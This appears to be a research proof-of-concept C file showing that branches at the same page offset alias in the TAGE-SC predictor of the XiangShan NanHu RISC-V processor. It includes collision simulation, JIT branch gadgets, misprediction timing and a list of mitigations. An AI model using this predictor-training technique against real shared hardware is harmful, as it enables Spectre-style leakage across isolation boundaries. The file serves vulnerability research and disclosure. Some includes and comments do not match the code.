/*
 * tage_sc_poc.c - TAGE-SC Branch Predictor Cross-Address Aliasing PoC
 *
 * Target : XiangShan NanHu RISC-V Processor (南湖架构)
 * Vulnerability : TAGE predictor entries are shared across address-space
 *                 boundaries when two branch PCs share the same page offset.
 *
 * ═══════════════════════════════════════════════════════════════════════
 * VULNERABILITY DESCRIPTION
 * ═══════════════════════════════════════════════════════════════════════
 *
 * The TAGE predictor in XiangShan NanHu computes the table index and tag
 * for each history table Ti as:
 *
 *   index(PC, H) = fold_idx(H, idx_fold_len)  XOR  PC[11:1]   (11-bit)
 *   tag  (PC, H) = fold_t1(H, tag1_len)
 *                  XOR (fold_t2(H, tag2_len) << 1)
 *                  XOR PC[8:1]                                  (8-bit)
 *
 * When two branches at PC_A and PC_B are preceded by the same global
 * branch history H:
 *
 *   index_A == index_B  ⟺  PC_A[11:1] == PC_B[11:1]
 *                       ⟺  (PC_A − PC_B) % 4096 == 0
 *
 *   tag_A   == tag_B    ⟺  PC_A[8:1]  == PC_B[8:1]
 *                       ⟺  (PC_A − PC_B) % 512  == 0
 *
 * Since 4096 is a multiple of 512, the collision condition reduces to:
 *
 *   ╔═══════════════════════════════════════════════════════════════╗
 *   ║  (PC_A − PC_B) % 4096 == 0  (same page offset)              ║
 *   ╚═══════════════════════════════════════════════════════════════╝
 *
 * Any two conditional branches at addresses that are a multiple of one
 * 4 KiB page apart will share the SAME TAGE entry (for all Ti tables
 * with history length ≤ 119 bits).
 *
 * ═══════════════════════════════════════════════════════════════════════
 * ATTACK SCENARIO
 * ═══════════════════════════════════════════════════════════════════════
 *
 *  1. Attacker places a "trainer" branch gadget at page-offset X in
 *     memory page P_A.
 *  2. Attacker repeatedly executes the trainer branch as TAKEN while
 *     ensuring a predictable 8-bit global history H_fixed arrives at
 *     that branch.  This causes the TAGE T1 entry at:
 *       idx = fold(H_fixed) XOR PC_A[11:1]
 *     to saturate its counter toward TAKEN.
 *  3. A victim branch resides in a different page P_B but at the SAME
 *     page offset X.  When the victim executes with history H_fixed,
 *     TAGE looks up the SAME entry → predicts TAKEN.
 *  4. If the victim's architectural direction is NOT-TAKEN, the CPU
 *     speculatively executes the taken path before discovering the
 *     misprediction — enabling classic Spectre-style information leakage
 *     or disrupting the victim's control flow.
 *
 * ═══════════════════════════════════════════════════════════════════════
 * STRUCTURE OF THIS FILE
 * ═══════════════════════════════════════════════════════════════════════
 *
 *  Part 1  - RISC-V JIT helpers (encode branch gadgets at exact addresses)
 *  Part 2  - Software TAGE simulation (verify collision analytically)
 *  Part 3  - Hardware timing measurement (observe misprediction penalty)
 *  Part 4  - SC component manipulation demonstration
 *  main()  - Orchestrates all phases and prints a detailed report
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
//#include <time.h>
//#include <assert.h>
#include <am.h>
#include <klib.h>

#include "tage_model.h"

/* =====================================================================
 * Part 1 - RISC-V JIT helpers
 *
 * Instruction-encoding helpers and build_gadget() are only compiled on
 * RISC-V targets.  On other architectures (x86-64, etc.) native C
 * fallback gadgets are used instead (see below).
 * ===================================================================== */

/*
 * Offset within a JIT page where the branch instruction is placed.
 * This value determines PC[11:0] of the branch and must be the same for
 * both the trainer and victim pages to guarantee TAGE index/tag collision.
 * Must be 4-byte aligned and satisfy BRANCH_OFFSET < PAGE_SIZE - 80.
 */
#define BRANCH_OFFSET  64

/* Function pointer type used for both JIT and native gadgets */
typedef int (*gadget_fn)(int /*cond*/);

#if defined(__riscv)

typedef uint32_t rv_insn;

/* B-type (branch) encoding */
static rv_insn rv_btype(int funct3, int rs1, int rs2, int offset)
{
    int imm12   = (offset >> 12) & 1;
    int imm11   = (offset >> 11) & 1;
    int imm10_5 = (offset >>  5) & 0x3f;
    int imm4_1  = (offset >>  1) & 0xf;
    return ((uint32_t)imm12   << 31) | ((uint32_t)imm10_5 << 25)
         | ((uint32_t)rs2     << 20) | ((uint32_t)rs1     << 15)
         | ((uint32_t)funct3  << 12) | ((uint32_t)imm4_1  <<  8)
         | ((uint32_t)imm11   <<  7) | 0x63u;
}

/* I-type (addi / jalr) encoding */
static rv_insn rv_itype(int funct3, int rd, int rs1, int imm, int opcode)
{
    return ((uint32_t)(imm & 0xfff) << 20) | ((uint32_t)rs1    << 15)
         | ((uint32_t)funct3        << 12) | ((uint32_t)rd      <<  7)
         | (uint32_t)opcode;
}

/* Convenience register numbers */
#define RV_ZERO  0   /* x0  - always zero        */
#define RV_RA    1   /* x1  - return address      */
#define RV_A0   10   /* x10 - argument / return   */

/* Instruction shorthands */
#define RV_RET   rv_itype(0, RV_ZERO, RV_RA, 0, 0x67)  /* jalr x0,ra,0 */

/* beq a0, x0, offset - branch if a0 == 0 */
static rv_insn rv_beq_a0_zero(int offset)
{
    return rv_btype(0 /*BEQ*/, RV_A0, RV_ZERO, offset);
}

/*
 * Build a branch gadget into the given page at byte BRANCH_OFFSET:
 *
 *   +0:  beq a0, x0, +12   // if (cond == 0) jump to not_taken
 *   +4:  addi a0, x0, 1    // taken:     return 1
 *   +8:  ret
 *   +12: addi a0, x0, 0    // not_taken: return 0
 *   +16: ret
 */
static void build_gadget(uint8_t *page_base)
{
    rv_insn *code = (rv_insn *)(page_base + BRANCH_OFFSET);
    code[0] = rv_beq_a0_zero(12);
    code[1] = rv_itype(0, RV_A0, RV_ZERO, 1, 0x13); /* addi a0, x0, 1 */
    code[2] = RV_RET;
    code[3] = rv_itype(0, RV_A0, RV_ZERO, 0, 0x13); /* addi a0, x0, 0 */
    code[4] = RV_RET;
    /* fence.i synchronises the I-cache with the D-cache on the local hart,
     * ensuring the newly written instructions are visible to the CPU before
     * the gadget is called.  __builtin___clear_cache is avoided here because
     * it emits a call to __riscv_flush_icache which is not always available
     * at link time (e.g. when linking against a bare-metal or minimal sysroot
     * that does not expose the vDSO helper).  For this single-threaded PoC
     * the local fence is sufficient; use the riscv_flush_icache(2) syscall
     * if cross-hart coherence is ever required. */
    __asm__ volatile ("fence.i" ::: "memory");
}

#endif /* __riscv */

/* =====================================================================
 * Native C fallback gadgets (used on non-RISC-V hosts)
 *
 * On x86-64 / other hosts the JIT RISC-V opcodes are invalid.  We keep
 * two separate noinline C functions so the compiler cannot merge them to
 * the same address.  The page-offset collision is verified analytically
 * by the simulation; the timing loop exercises the C-level misprediction
 * penalty instead.
 * ===================================================================== */

static __attribute__((unused)) int native_trainer(int cond)
{
    if (cond) return 1;
    return 0;
}

static __attribute__((unused)) int native_victim(int cond)
{
    if (cond) return 1;
    return 0;
}

/* =====================================================================
 * Part 2 - Software TAGE simulation (analytic collision proof)
 * ===================================================================== */

/*
 * Verify that two PCs whose addresses differ by exactly PAGE_SIZE bytes
 * (same page offset) produce the same TAGE index AND the same tag for
 * every table Ti, when preceded by the same global history.
 *
 * Returns true if a collision is confirmed for ALL four tables.
 */
static bool verify_collision(uint64_t pc_a, uint64_t pc_b, uint64_t history)
{
    bool all_match = true;
    printf("\n[Simulation] Collision analysis for:\n");
    printf("  PC_A = 0x%016lx\n", (unsigned long)pc_a);
    printf("  PC_B = 0x%016lx\n", (unsigned long)pc_b);
    printf("  ΔPC  = 0x%lx (%ld pages)\n",
           (unsigned long)(pc_b - pc_a),
           (long)((pc_b - pc_a) / 4096));
    printf("  History (lower 8 bits) = 0x%02x\n\n", (unsigned)(history & 0xff));

    printf("  %-4s  %-10s  %-10s  %-10s  %-10s  %s\n",
           "Ti", "idx_A", "idx_B", "tag_A", "tag_B", "Collision?");
    printf("  %-4s  %-10s  %-10s  %-10s  %-10s  %s\n",
           "----", "----------", "----------", "----------", "----------",
           "----------");

    for (int t = 0; t < TAGE_NUM_TABLES; t++) {
        const TageTableCfg *cfg = &TAGE_CFG[t];
        uint32_t idx_a = tage_index(pc_a, history, cfg);
        uint32_t idx_b = tage_index(pc_b, history, cfg);
        uint32_t tag_a = tage_tag  (pc_a, history, cfg);
        uint32_t tag_b = tage_tag  (pc_b, history, cfg);
        bool match     = (idx_a == idx_b) && (tag_a == tag_b);
        if (!match) all_match = false;
        printf("  T%-3d  0x%08x  0x%08x  0x%08x  0x%08x  %s\n",
               t + 1, idx_a, idx_b, tag_a, tag_b,
               match ? "YES ✓" : "NO  ✗");
    }
    return all_match;
}

/*
 * Simulate the full training+attack cycle in the software TAGE model.
 *
 * 1. Train T1 entry at pc_trainer as TAKEN (500 iterations).
 * 2. Query T1 at pc_victim (same page offset) with the same history.
 * 3. Return the prediction for the victim (should be TAKEN = 1).
 */
static int simulate_attack(uint64_t pc_trainer, uint64_t pc_victim,
                            uint64_t history, int train_iters)
{
    TageTable t1;
    tage_table_init(&t1, 0 /*T1*/);

    /* Training phase: force the entry toward TAKEN */
    for (int i = 0; i < train_iters; i++)
        tage_table_update(&t1, pc_trainer, history, true /*taken*/);

    /* Query at victim address */
    TageEntry *entry = NULL;
    bool hit = tage_table_lookup(&t1, pc_victim, history, &entry);
    if (!hit) {
        printf("  [simulation] victim lookup MISSED (unexpected)\n");
        return -1;
    }
    bool pred = ctr_pred(entry->ctr);
    printf("\n[Simulation] After %d TAKEN trainings at PC_A:\n", train_iters);
    printf("  T1 entry ctr = %d  →  prediction at PC_B = %s\n",
           entry->ctr, pred ? "TAKEN" : "NOT-TAKEN");
    return (int)pred;
}

/* =====================================================================
 * Part 3 - Hardware timing measurement
 * ===================================================================== */

/* Read the RISC-V cycle counter (rdcycle CSR). Falls back to
 * clock_gettime on non-RISC-V hosts for portability. */
static inline uint64_t read_cycles(void)
{
#if defined(__riscv)
    uint64_t c;
    __asm__ volatile("rdcycle %0" : "=r"(c));
    return c;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
#endif
}

/*
 * Execute a history primer: 64 always-taken conditional branches.
 *
 * 64 branches set the lower 64 bits of the global history register,
 * covering all four TAGE tables (T1: 8-bit, T2: 13-bit, T3: 32-bit,
 * T4: 119-bit partially).  Using 64 instead of 16 branches improves
 * aliasing reliability for T3 (32-bit history) which was unreliable with
 * the previous 16-branch primer.
 *
 * The volatile prevents the compiler from hoisting or eliminating the
 * branches; we deliberately omit __builtin_expect so the real hardware
 * branch predictor learns from the actual execution outcomes.
 */
static __attribute__((noinline)) void prime_history(void)
{
    volatile int one = 1;
    /* 64 always-taken branches — covers T1/T2/T3 history lengths fully
     * and partially covers T4 (119-bit). */
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
    if (one) {} if (one) {} if (one) {} if (one) {}
}

/*
 * Training repetitions per trial, total trial count, and warmup depth.
 *
 * TRAIN_ITERS  - branches executed as TAKEN per trial to saturate the
 *                3-bit TAGE counter (max = +3) with high confidence.
 *                Raised from 500 → 2 000 to improve T3/T4 coverage.
 *
 * TRIAL_COUNT  - independent train→measure trials for both the baseline
 *                and attack phases.  More trials expose the misprediction
 *                rate distribution better than a single aggregate average.
 *
 * WARMUP_ITERS - NOT-TAKEN victim calls before Phase 0 measurement.
 *                Without this the predictor has no entry at all, so the
 *                baseline Phase 0 exhibits cold-miss latency identical to
 *                a misprediction — making both phases look the same.
 */
#define TRAIN_ITERS   2000
#define TRIAL_COUNT    200
#define WARMUP_ITERS  2000

/*
 * Warm up the victim branch by calling it NOT-TAKEN `iters` times so
 * the predictor builds a well-trained NOT-TAKEN entry before any timing
 * measurement begins.  Without this step Phase 0 measures an untrained
 * ("cold") predictor whose latency already matches a misprediction,
 * masking the attack signal.
 */
static void warmup_not_taken(gadget_fn fn, int iters)
{
    for (int i = 0; i < iters; i++) {
        prime_history();
        fn(0 /*not-taken*/);
    }
}

/*
 * Baseline trial: re-enforce the correct NOT-TAKEN predictor entry by
 * running the victim NOT-TAKEN `train_n` times, then take a single
 * cycle-accurate measurement of one more NOT-TAKEN victim call.
 *
 * Returning the raw elapsed cycles for one call avoids the averaging
 * artifact in the original measure_avg_cycles() approach: 2 000-round
 * averaging allowed the predictor to re-learn the correct direction
 * after the first misprediction, diluting the attack signal.
 */
static uint64_t baseline_trial(gadget_fn victim, int train_n)
{
    for (int i = 0; i < train_n; i++) {
        prime_history();
        victim(0 /*not-taken*/);
    }
    prime_history();
    uint64_t t0 = read_cycles();
    volatile int r = victim(0 /*not-taken*/);
    uint64_t t1 = read_cycles();
    (void)r;
    return t1 - t0;
}

/*
 * Attack trial: train the ALIASED TAGE entry as TAKEN by running the
 * trainer branch TAKEN `train_n` times, then immediately measure ONE
 * victim call that should now be mis-predicted TAKEN.
 *
 * The single-shot approach captures the misprediction before the
 * predictor can observe the victim's true NOT-TAKEN outcome and self-
 * correct — which was the main flaw in the original bulk-average method.
 *
 * A RISC-V fence is inserted between training and measurement to ensure
 * all branch-predictor updates are committed before the victim is fetched.
 */
static uint64_t attack_trial(gadget_fn trainer, gadget_fn victim, int train_n)
{
    for (int i = 0; i < train_n; i++) {
        prime_history();
        trainer(1 /*taken*/);
    }
#if defined(__riscv)
    /* Ensure all branch-predictor updates from the training loop are
     * visible to the front-end before fetching the victim instruction. */
    __asm__ volatile("fence" ::: "memory");
#endif
    prime_history();
    uint64_t t0 = read_cycles();
    volatile int r = victim(0 /*not-taken — should be mis-predicted TAKEN*/);
    uint64_t t1 = read_cycles();
    (void)r;
    return t1 - t0;
}

/*
 * Full hardware timing attack — revised methodology:
 *
 *  Phase 0: Warmup + baseline
 *    - Run victim NOT-TAKEN WARMUP_ITERS times so the predictor has a
 *      correct NOT-TAKEN entry before any measurement (critical fix).
 *    - Collect TRIAL_COUNT baseline_trial() single-shot samples.
 *
 *  Phase 1 + 2: Attack
 *    - Collect TRIAL_COUNT attack_trial() single-shot samples.
 *    - Each trial freshly trains TAGE via the aliased trainer, then takes
 *      exactly one victim measurement before the predictor can recover.
 *
 *  Evaluation: report min / average / misprediction rate (fraction of
 *  attack trials exceeding baseline_avg × 1.25).
 */
static void hardware_timing_attack(gadget_fn trainer, gadget_fn victim,
                                   uint64_t pc_a,     uint64_t pc_b)
{
    printf("\n[Hardware] Timing-based misprediction measurement\n");
    printf("  Branch offset within page: +%d bytes\n", BRANCH_OFFSET);
    printf("  Trainer PC = 0x%lx  Victim PC = 0x%lx\n",
           (unsigned long)pc_a, (unsigned long)pc_b);
    printf("  Train iters per trial = %d  |  Trials = %d\n\n",
           TRAIN_ITERS, TRIAL_COUNT);

    /* Phase 0: seed the predictor with correct NOT-TAKEN before baseline */
    warmup_not_taken(victim, WARMUP_ITERS);

    uint64_t base_min = UINT64_MAX, base_sum = 0;
    for (int t = 0; t < TRIAL_COUNT; t++) {
        uint64_t d = baseline_trial(victim, TRAIN_ITERS);
        if (d < base_min) base_min = d;
        base_sum += d;
    }
    uint64_t base_avg = base_sum / TRIAL_COUNT;
    printf("  Phase 0 (baseline, victim NOT-TAKEN, no cross-training):\n");
    printf("    min = %lu cycles,  avg = %lu cycles\n\n",
           (unsigned long)base_min, (unsigned long)base_avg);

    /* Phase 1: train via aliasing; Phase 2: single-shot measurement */
    printf("  Phase 1: training TAKEN %d× per trial at trainer address.\n",
           TRAIN_ITERS);
    uint64_t atk_min = UINT64_MAX, atk_sum = 0;
    int mispred_count = 0;
    uint64_t threshold = base_avg + base_avg / 4; /* base_avg × 1.25 */
    for (int t = 0; t < TRIAL_COUNT; t++) {
        uint64_t d = attack_trial(trainer, victim, TRAIN_ITERS);
        if (d < atk_min) atk_min = d;
        atk_sum += d;
        if (d > threshold) mispred_count++;
    }
    uint64_t atk_avg = atk_sum / TRIAL_COUNT;
    printf("  Phase 2 (attack, victim NOT-TAKEN, immediately after training):\n");
    printf("    min = %lu cycles,  avg = %lu cycles\n",
           (unsigned long)atk_min, (unsigned long)atk_avg);
    printf("    Trials with significant overhead (>25%% above baseline): "
           "%d / %d  (%.1f%%)\n",
           mispred_count, TRIAL_COUNT,
           100.0 * mispred_count / TRIAL_COUNT);

    /* Evaluation */
    double overhead = 0.0;
    if (base_avg > 0)
        overhead = 100.0 * ((double)atk_avg - (double)base_avg) / (double)base_avg;

    printf("\n  Timing overhead (avg): %.1f%%\n", overhead);
    if (overhead > 15.0 || mispred_count > TRIAL_COUNT / 10) {
        printf("  [RESULT] VULNERABLE -- %.1f%% average slowdown / %d misprediction\n"
               "           events indicate branch predictor aliasing is active.\n",
               overhead, mispred_count);
    } else {
        printf("  [RESULT] No significant overhead measured on this host.\n"
               "           Run on XiangShan hardware for definitive results.\n");
    }
}

/* =====================================================================
 * Part 4 - SC component manipulation demonstration
 * ===================================================================== */

/*
 * SC (Statistical Corrector) aliasing demonstration.
 *
 * The SC tables are indexed by:
 *   sc_index[8:0] = PC[8:1] XOR fold(history, 8)
 *
 * With the same history H, two branches at PC_A and PC_B alias in SC iff:
 *   PC_A[8:1] == PC_B[8:1]  ⟺  (PC_A − PC_B) % 512 == 0
 *
 * This is a weaker condition than the TAGE collision (% 4096), meaning
 * SC aliasing affects a larger set of address pairs.  An attacker can
 * skew the SC thresholds via repeated SC-affecting branches, increasing
 * the probability that SC reverses TAGE's correct prediction for the
 * victim.
 */
static void demonstrate_sc_aliasing(uint64_t pc_a, uint64_t pc_b,
                                    uint64_t history)
{
    uint32_t sc_idx_mask = (1u << 9) - 1u; /* SC uses 9-bit index (512 entries) */
    uint8_t fold8 = (uint8_t)fold_history(history, 8, 8);

    uint32_t sc_idx_a = ((uint32_t)(pc_a >> 1) ^ fold8) & sc_idx_mask;
    uint32_t sc_idx_b = ((uint32_t)(pc_b >> 1) ^ fold8) & sc_idx_mask;

    printf("\n[SC Aliasing]\n");
    printf("  SC index formula: (PC[8:1] XOR fold8(H)) mod 512\n");
    printf("  SC index for PC_A = 0x%03x\n", sc_idx_a);
    printf("  SC index for PC_B = 0x%03x\n", sc_idx_b);
    if (sc_idx_a == sc_idx_b)
        printf("  → Indices MATCH: SC counters trained at PC_A affect PC_B ✓\n");
    else
        printf("  → Indices differ: increase address separation to %u bytes "
               "for SC aliasing.\n", 512u);

    printf("\n  Manipulation path:\n");
    printf("  1. Attacker executes many branches at PC_A whose true direction\n"
           "     is TAKEN, inflating the SC sum at sc_index %u.\n", sc_idx_a);
    printf("  2. When victim at PC_B runs, its SC sum reads the inflated value.\n");
    printf("  3. If TAGE predicts NOT-TAKEN for victim, SC may REVERSE it to\n"
           "     TAKEN — even when the victim should NOT be taken.\n");
    printf("  4. This mis-reversal guides speculative execution down the\n"
           "     attacker-chosen path, enabling Spectre-style exploitation.\n");
}

/* =====================================================================
 * Mitigation summary
 * ===================================================================== */

static void print_mitigations(void)
{
    printf("\n══════════════════════════════════════════════════\n");
    printf("MITIGATIONS\n");
    printf("══════════════════════════════════════════════════\n");
    printf("1. Increase TAGE tag width beyond 8 bits to lower collision\n"
           "   probability (8-bit tag → 1/256 uncontrolled alias rate).\n\n");
    printf("2. Introduce process/ASID-based branch predictor partitioning\n"
           "   (e.g., XOR the ASID into the TAGE index/tag computation).\n\n");
    printf("3. Flush predictor state on privilege-level transitions\n"
           "   (IBPB-equivalent: Indirect Branch Predictor Barrier).\n\n");
    printf("4. Use randomised page-offset placement for security-sensitive\n"
           "   branch sites to prevent deterministic aliasing.\n\n");
    printf("5. Disable SC reversal for cross-privilege boundary targets,\n"
           "   or apply ASID gating to SC table indexing.\n");
}

/* =====================================================================
 * main
 * ===================================================================== */

int main(void)
{
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  TAGE-SC Branch Predictor Cross-Address Aliasing PoC        ║\n");
    printf("║  Target: XiangShan NanHu (南湖) RISC-V Processor            ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");

    /* ------------------------------------------------------------------
     * Step 1: Allocate two executable pages and set up branch gadgets.
     *
     * On RISC-V hardware we JIT-compile minimal branch sequences into
     * mmap'd pages at a fixed page offset (BRANCH_OFFSET) so we have
     * precise control over the branch PC.
     *
     * On non-RISC-V hosts (x86-64, simulation) we use native C functions
     * instead; the JIT RISC-V opcodes would be illegal instructions there.
     * The analytic collision proof (Step 3) is architecture-independent.
     * ------------------------------------------------------------------ */
    printf("[Setup] Allocating two consecutive executable pages...\n");

    uint64_t pc_a, pc_b;
    gadget_fn trainer_fn, victim_fn;

#if defined(__riscv)
    /* Static buffer used as executable memory for the two branch gadgets.
     * In the AM bare-metal environment there is no W^X protection, so the
     * CPU can fetch and execute instructions placed in this buffer. */
    static uint8_t region[4096 * 4];
    memset(region, 0, sizeof(region));

    uint8_t *page_trainer = (uint8_t *)region;
    uint8_t *page_victim  = (uint8_t *)region + 4096;

    build_gadget(page_trainer);
    build_gadget(page_victim);

    trainer_fn = (gadget_fn)(page_trainer + BRANCH_OFFSET);
    victim_fn  = (gadget_fn)(page_victim  + BRANCH_OFFSET);

    pc_a = (uint64_t)(uintptr_t)trainer_fn;
    pc_b = (uint64_t)(uintptr_t)victim_fn;
#else
    /*
     * Non-RISC-V fallback: use native C functions.
     * We still need two addresses that share a page offset.  Fabricate
     * them by starting from the actual function pointers and adjusting
     * so they are exactly one page apart (same offset within page).
     */
    trainer_fn = native_trainer;
    victim_fn  = native_victim;

    pc_a = (uint64_t)(uintptr_t)native_trainer;
    /* Round pc_b to same page offset as pc_a, one page above pc_a */
    pc_b = (pc_a & ~(uint64_t)0xfff)          /* page base of pc_a */
           + (uint64_t)0x1000                  /* advance one page  */
           + (pc_a & (uint64_t)0xfff);         /* restore offset    */
    printf("  (non-RISC-V host: using native C functions; "
           "victim PC is synthetic for collision analysis)\n");
#endif

    printf("  trainer branch PC : 0x%016lx\n", (unsigned long)pc_a);
    printf("  victim  branch PC : 0x%016lx\n", (unsigned long)pc_b);
    printf("  PC_A[11:1]        : 0x%03lx\n",  (unsigned long)((pc_a >> 1) & 0x7ff));
    printf("  PC_B[11:1]        : 0x%03lx\n",  (unsigned long)((pc_b >> 1) & 0x7ff));

    assert((pc_a & 0xfff) == (pc_b & 0xfff) &&
           "Page offsets must match for TAGE aliasing");

    printf("  Page offsets match: 0x%03lx == 0x%03lx  ✓\n\n",
           (unsigned long)(pc_a & 0xfff),
           (unsigned long)(pc_b & 0xfff));

    /* ------------------------------------------------------------------
     * Step 2: Analytic collision proof (software TAGE simulation).
     * Use a fixed history value H = 0xAB (arbitrary but deterministic).
     * ------------------------------------------------------------------ */
    uint64_t fixed_history = 0xAB;
    bool collides = verify_collision(pc_a, pc_b, fixed_history);
    if (!collides) {
        printf("\n[BUG] Unexpected: simulation shows no collision for same-page-offset PCs.\n"
               "      Check TAGE_IDX_BITS and fold_history() implementation.\n");
        return 1;
    }

    /* ------------------------------------------------------------------
     * Step 3: Simulate the full training → attack cycle in software.
     * ------------------------------------------------------------------ */
    int sim_result = simulate_attack(pc_a, pc_b, fixed_history, TRAIN_ITERS);
    if (sim_result == 1)
        printf("  [OK] Software simulation confirms: victim is predicted TAKEN "
               "after training at trainer address.\n");

    /* ------------------------------------------------------------------
     * Step 4: SC aliasing demonstration.
     * ------------------------------------------------------------------ */
    demonstrate_sc_aliasing(pc_a, pc_b, fixed_history);

    /* ------------------------------------------------------------------
     * Step 5: Hardware timing measurement.
     * Only meaningful on actual XiangShan hardware; on x86/emulation the
     * timing ratios will differ but the code path is exercised correctly.
     * ------------------------------------------------------------------ */
    hardware_timing_attack(trainer_fn, victim_fn, pc_a, pc_b);

    /* ------------------------------------------------------------------
     * Step 6: Print mitigation recommendations.
     * ------------------------------------------------------------------ */
    print_mitigations();

    return 0;
}
